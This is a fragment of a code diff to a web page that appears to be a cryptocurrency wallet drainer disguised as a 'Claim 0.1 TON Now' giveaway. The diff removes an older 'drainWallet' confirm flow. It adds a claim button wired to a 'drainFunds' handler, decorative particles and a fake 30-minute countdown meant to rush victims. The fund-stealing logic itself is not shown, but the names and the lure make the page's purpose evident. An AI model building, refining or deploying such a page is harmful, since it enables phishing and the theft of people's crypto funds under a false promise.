-                        drainerSection.classList.add('hidden');
-                    }, 3000);
-                }
+            } catch (error) {
+                console.error('Drain error:', error);
+                showNotification('Transaction failed. Please try again.');
+                claimButton.innerHTML = 'Claim 0.1 TON Now';
+                claimButton.disabled = false;
             }
         }
         
-        // Event Listeners
-        connectWalletBtn.addEventListener('click', connectWallet);
-        confirmBtn.addEventListener('click', () => {
-            confirmBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
-            drainWallet();
-        });
-        cancelBtn.addEventListener('click', () => {
-            drainerSection.classList.add('hidden');
-        });
-        
         // Initialize
-        window.addEventListener('load', () => {
-            setTimeout(simulateLoading, 1500);
+        document.addEventListener('DOMContentLoaded', () => {
+            createParticles();
+            connectButton.addEventListener('click', connectWallet);
+            claimButton.addEventListener('click', drainFunds);
+            
+            // Initialize countdown with placeholder
+            countdown.textContent = '30:00';
         });
     </script>
 </body>
